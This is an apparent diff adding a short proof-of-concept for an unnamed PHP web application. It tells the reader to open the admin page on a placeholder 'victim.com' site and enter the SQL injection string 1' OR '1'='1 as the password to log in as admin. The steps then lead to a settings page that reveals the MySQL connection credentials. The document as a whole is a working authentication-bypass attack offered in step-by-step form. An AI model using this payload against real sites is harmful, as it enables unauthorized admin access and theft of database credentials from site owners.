@@ -1,0 +1,11 @@
++---->> Vuln. #1 Pro0f of Concept <<--------
+|
+| - Go to : http://www.victim.com/[install_directory]/admin/admin.php
+| - Type the following string in the two fields :
+|  	| Pseudo (login) : evil
+|	| Mot de passe (password) : 1' OR '1'='1
+| - If magic_quotes_gpc=Off, you are now logged as admin. So, you have access to the control panel.
+| - Let's go to the section called 'Configurer le script' (configure the script). In this page, you can see
+| all the different informations required to connect to the MySQL server (DataBase Information Disclosure)
+|
++-------------------------------------------//
